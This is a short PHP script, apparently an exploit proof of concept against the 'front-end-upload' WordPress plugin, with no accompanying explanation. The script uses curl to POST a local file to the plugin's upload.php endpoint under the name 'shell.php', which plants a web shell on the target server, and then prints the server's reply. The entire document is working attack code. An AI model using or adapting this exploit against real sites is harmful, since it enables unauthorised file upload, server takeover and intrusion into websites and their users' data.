<?php
$u="whatelse.php";
$c = curl_init("http://server/wp-content/plugins/front-end-upload/upload.php");
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,
array('file'=>"@$u",'name'=>"shell.php"));
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$e = curl_exec($c);
curl_close($c);
echo $e;
?>
